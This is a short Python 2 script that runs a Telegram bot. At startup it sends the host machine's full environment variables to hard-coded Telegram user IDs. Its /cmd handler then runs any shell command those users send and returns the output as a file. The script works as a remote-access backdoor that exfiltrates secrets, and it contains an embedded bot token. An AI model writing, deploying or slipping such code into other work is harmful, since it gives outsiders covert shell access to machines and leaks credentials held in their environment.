#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import telebot
import sys

reload(sys)
sys.setdefaultencoding("utf-8")

TOKEN = '267310245:AAH7d3brKnAmu722qncGIzLsu7Wzu_DYSV8'

bot = telebot.TeleBot(TOKEN)
sudo = [YOUR_ID, YOUR_ID]

try:
    aaa = os.environ
    for x in sudo:
        bot.send_message(x, str(aaa))
except:
    pass

@bot.message_handler(commands=['cmd'])
def run_cmd(m):
    if m.from_user.id in sudo:
        text=m.text
        try:
            TeXT = str(m.text).split(" ")[0]
            TEXT = str(m.text).strip(TeXT)
            CMD = os.popen(TEXT).read()
            m_id = m.message_id
            cmd_file = open('cmd.txt', 'w')
            cmd_file.write(str(CMD))
            cmd_file.close()
            bot.send_document(m.chat.id, open('cmd.txt', 'rb'), reply_to_message_id=m_id)
        except Exception, eee:
            bot.reply_to(m, eee)
    else:
        pass

bot.polling()
